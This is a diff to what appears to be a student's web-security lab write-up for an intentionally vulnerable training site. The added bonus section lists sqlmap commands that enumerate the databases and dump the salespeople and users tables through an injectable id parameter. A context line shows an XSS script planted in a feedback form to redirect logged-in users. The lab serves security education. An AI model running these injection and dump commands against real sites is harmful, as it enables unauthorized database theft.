@@ -73,6 +73,14 @@ Vulnerability #2: Cross-Site Request Forgery (CSRF)
 
 ## Bonus Objectives
 
+Bonus Objective 1: Build on Objective #3 (SQL Injection). Experiment to see what other kinds of information you can get the database to reveal.
+* Using the tool sqlmap, additional information is extracted using the following prompts: 
+* ```sqlmap -u https://35.184.21.59/blue/public/salesperson.php?id=1 --no-cast --dbs```
+* ```sqlmap -u https://35.184.21.59/blue/public/salesperson.php?id=1 --no-cast --tables -D globitek_blue```
+* ```sqlmap -u https://35.184.21.59/blue/public/salesperson.php?id=1 --no-cast --dump -T salespeople,users -D globitek_blue```
+
+<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/bonus1.gif">
+
 Bonus Objective 2: Build on Objective #4 (Cross-Site Scripting). Experiment to see if you can use XSS to: a) direct the user to a new URL, b) read cookie data, c) set cookie data.
 * Inject the script ```<script>document.location = "https://google.com";</script>``` into feedback form. When a logged in user checks the feedback, the script will redirect them to https://google.com
 
